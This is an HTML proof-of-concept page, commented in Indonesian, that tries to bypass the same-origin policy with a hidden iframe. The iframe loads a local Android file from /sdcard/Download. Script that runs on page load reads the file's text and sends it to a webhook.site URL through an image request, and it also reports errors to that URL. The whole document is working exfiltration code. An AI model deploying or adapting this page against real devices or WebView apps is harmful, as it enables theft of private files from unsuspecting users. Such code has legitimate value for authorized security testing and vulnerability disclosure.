                <!DOCTYPE html>
<html>
<head>
    <title>Bypass PoC - Iframe Method</title>
</head>
<body>
    <h3>Menguji Bypass via Iframe...</h3>
    
    <iframe id="targetFrame" src="file:///sdcard/Download/test.txt" style="display:none;"></iframe>

    <script>
        const webhookUrl = 'https://webhook.site/8020a520-ac20-474c-bb29-35cf02751528';

        window.onload = function() {
            // Berikan jeda 1 detik agar iframe selesai memuat file secara sempurna
            setTimeout(function() {
                try {
                    var frame = document.getElementById('targetFrame');
                    // Mengakses konten teks di dalam iframe
                    var stolenData = frame.contentWindow.document.body.innerText || frame.contentDocument.body.innerText;
                    
                    if (stolenData) {
                        alert("Iframe Berhasil Membaca! Mengirim data...");
                        sendExfil(stolenData);
                    } else {
                        sendError("Iframe termuat tapi konten kosong.");
                    }
                } catch (e) {
                    sendError("Iframe terblokir SOP: " + e.message);
                }
            }, 1000);
        };

        function sendExfil(data) {
            var img = new Image();
            img.src = webhookUrl + "?method=iframe&data=" + encodeURIComponent(data);
        }

        function sendError(msg) {
            var img = new Image();
            img.src = webhookUrl + "?method=iframe_err&msg=" + encodeURIComponent(msg);
        }
    </script>
</body>
</html>
